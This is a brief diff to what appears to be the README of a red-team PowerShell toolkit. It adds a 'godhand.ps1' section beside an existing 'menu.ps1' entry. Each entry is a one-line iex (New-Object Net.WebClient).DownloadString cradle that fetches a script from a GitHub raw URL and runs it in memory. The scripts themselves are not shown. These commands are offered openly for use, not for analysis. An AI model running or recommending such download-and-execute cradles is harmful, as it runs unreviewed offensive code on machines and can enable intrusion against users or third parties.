@@ -15,3 +15,8 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/menu.ps1') 
 ```
+
+## godhand.ps1
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/godhand.ps1') 
+```
